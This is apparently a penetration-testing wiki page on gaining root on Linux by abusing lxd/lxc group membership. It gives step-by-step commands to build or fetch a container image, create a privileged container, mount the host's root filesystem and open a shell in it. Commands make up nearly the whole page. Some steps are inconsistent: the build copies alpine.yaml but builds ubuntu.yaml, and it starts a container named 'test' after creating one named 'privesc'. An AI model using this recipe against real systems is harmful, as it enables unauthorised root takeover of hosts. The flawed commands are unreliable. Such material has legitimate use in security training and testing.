# lxc - Privilege escalation

If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root

## Exploiting without internet

You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)\(follow the instructions of the github\):

```text
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
cd
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
cp $HOME/go/src/github.com/lxc/distrobuilder/doc/examples/alpine alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd ubuntu.yaml
```

Then, upload to the server the files **lxd.tar.xz** and **rootfs.squashfs**

Add the image:

```text
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

Create a container and add root path

```text
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Execute the container:

```text
lxc start test
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted 
```

## With internet

You can follow [these instructions](https://reboare.github.io/lxd/lxd-escape.html).

```text
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted 
```

## Other Refs

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}



